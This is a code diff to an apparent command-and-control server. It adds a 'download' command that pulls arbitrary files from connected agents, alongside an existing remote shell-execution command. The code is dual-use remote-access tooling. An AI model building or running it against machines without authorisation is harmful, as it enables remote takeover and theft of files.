@@ -63,8 +63,36 @@ def handle_agent(conn, addr):
                     print(f"Output: {msg}")
                 except Exception as e:
                     print(f"Error: {e}")
+                continue    
+            
+            if cmd.startswith("download "):
+                try:
+                    remote_path = cmd.split(" ", 1)[1]
+                    payload = remote_path.encode()
+                    header = struct.pack("!II", 3, len(payload))
+                    
+                    conn.sendall(header + payload)
+                    
+                    resp_h = receive_exact(conn ,8)
+                    if not resp_h:
+                        print("No response")
+                        break
+                    
+                    r_id, r_len = struct.unpack("!II", resp_h)
+                    
+                    if r_id == 5:
+                        err_msg =  receive_exact(conn, r_len).decode()
+                        print(f"Agent error {err_msg}")
+                    elif r_id == 3:
+                        file_bytes = receive_exact(conn, r_len)
+                        out_name = f"downloaded-{os.path.basename(remote_path)}"
+                        with open(out_name, "wb") as f:
+                            f.write(file_bytes)
+                        print(f"Saved as {out_name}")
+                except Exception as e:
+                    print(f'Error: {e}')
                 continue
-                                                    
+                           
             payload = cmd.encode()
             header = struct.pack("!II", 1, len(payload)) # 1 - shell execution
             conn.sendall(header + payload)
